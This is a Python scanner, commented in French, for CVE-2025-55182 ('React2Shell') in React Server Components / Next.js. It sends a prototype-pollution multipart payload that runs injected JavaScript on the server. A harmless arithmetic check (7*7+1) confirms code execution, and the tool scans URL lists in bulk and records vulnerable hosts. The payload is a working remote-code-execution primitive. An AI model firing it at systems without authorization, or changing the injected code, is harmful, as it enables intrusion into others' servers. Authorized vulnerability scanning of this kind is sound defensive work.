#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) - Scanner de Vulnérabilité

Scanne les cibles pour détecter si elles sont vulnérables à CVE-2025-55182
sans exécuter de commandes nuisibles.

À DES FINS ÉDUCATIVES ET DE TESTS AUTORISÉS UNIQUEMENT.

Utilisation :
    python3 scanner.py -u <url>
    python3 scanner.py -f <fichier_avec_urls>
    
Exemples :
    python3 scanner.py -u http://localhost:3000
    python3 scanner.py -f targets.txt --threads 10
"""

import argparse
import requests
import json
import sys
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║         Scanner CVE-2025-55182 (React2Shell)                  ║
║                                                               ║
║  Détecte les Composants Serveur React / Next.js vulnérables   ║
║                                                               ║
║  ⚠️  POUR TESTS DE SÉCURITÉ AUTORISÉS UNIQUEMENT              ║
╚═══════════════════════════════════════════════════════════════╝
"""


def create_detection_payload() -> str:
    """
    Créer un payload de détection sûr qui effectue une opération arithmétique
    au lieu d'exécuter des commandes système.
    """
    # Payload sûr qui fait juste des maths - prouve l'exécution de code sans danger
    payload_obj = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            # Sûr : calcule juste 7*7+1 = 50
            "_prefix": (
                "var res=String(7*7+1);"
                ";throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }
    return json.dumps(payload_obj)


def scan_target(url: str, timeout: int = 10) -> dict:
    """
    Scanner une cible unique pour la vulnérabilité CVE-2025-55182.
    
    Args:
        url: URL cible
        timeout: Délai d'attente de la requête
        
    Returns:
        Dictionnaire de résultat du scan
    """
    url = url.rstrip('/')
    boundary = "WebKitFormBoundaryScannerTest"
    
    headers = {
        "User-Agent": "Scanner-CVE-2025-55182/1.0",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
    }
    
    payload = create_detection_payload()
    body = f"""------{boundary}\r
Content-Disposition: form-data; name="0"\r
\r
{payload}\r
------{boundary}\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------{boundary}\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------{boundary}--\r
"""
    
    result = {
        'url': url,
        'vulnerable': False,
        'status_code': None,
        'evidence': None,
        'error': None
    }
    
    try:
        response = requests.post(
            url,
            headers=headers,
            data=body.encode(),
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        result['status_code'] = response.status_code
        
        # Vérifier notre résultat arithmétique (50) dans la réponse
        if '"digest":"50"' in response.text:
            result['vulnerable'] = True
            result['evidence'] = 'Exécution arithmétique confirmée (7*7+1=50)'
        elif response.status_code in [303, 500]:
            # Heuristiques supplémentaires
            if 'text/x-component' in response.headers.get('Content-Type', ''):
                result['vulnerable'] = True
                result['evidence'] = 'Réponse RSC avec code de statut suspect'
                
    except requests.exceptions.Timeout:
        result['error'] = 'Délai dépassé'
    except requests.exceptions.ConnectionError:
        result['error'] = 'Connexion refusée'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def print_result(result: dict):
    """Afficher le résultat du scan formaté."""
    url = result['url']
    
    if result['error']:
        print(f"[ERREUR] {url} - {result['error']}")
    elif result['vulnerable']:
        print(f"\033[91m[VULNÉRABLE]\033[0m {url} - Statut : {result['status_code']}")
        if result['evidence']:
            print(f"            Preuve : {result['evidence']}")
    else:
        print(f"\033[92m[SÛR]\033[0m {url} - Statut : {result['status_code']}")


def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='Scanner de Vulnérabilité CVE-2025-55182'
    )
    parser.add_argument(
        '-u', '--url',
        help='URL unique à scanner'
    )
    parser.add_argument(
        '-f', '--file',
        help='Fichier contenant des URLs (une par ligne)'
    )
    parser.add_argument(
        '-t', '--threads',
        type=int,
        default=5,
        help='Nombre de threads simultanés (défaut : 5)'
    )
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Délai d\'attente de requête en secondes (défaut : 10)'
    )
    parser.add_argument(
        '-o', '--output',
        help='Fichier de sortie pour les URLs vulnérables'
    )
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    # Collecter les URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        try:
            with open(args.file, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"[-] Fichier non trouvé : {args.file}")
            sys.exit(1)
    
    print(f"[*] {len(urls)} cible(s) chargée(s)")
    print(f"[*] Utilisation de {args.threads} thread(s)")
    print(f"[*] Timeout : {args.timeout}s")
    print("")
    
    vulnerable_urls = []
    
    # Scan avec pool de threads
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(scan_target, url, args.timeout): url 
            for url in urls
        }
        
        for future in as_completed(futures):
            result = future.result()
            print_result(result)
            
            if result['vulnerable']:
                vulnerable_urls.append(result['url'])
    
    # Résumé
    print("")
    print("=" * 60)
    print(f"SCAN TERMINÉ")
    print(f"Total scanné : {len(urls)}")
    print(f"Vulnérable : {len(vulnerable_urls)}")
    print(f"Sûr/Inaccessible : {len(urls) - len(vulnerable_urls)}")
    print("=" * 60)
    
    # Sauvegarder les URLs vulnérables si demandé
    if args.output and vulnerable_urls:
        with open(args.output, 'w') as f:
            f.write('\n'.join(vulnerable_urls))
        print(f"\n[+] URLs vulnérables sauvegardées dans : {args.output}")


if __name__ == "__main__":
    main()
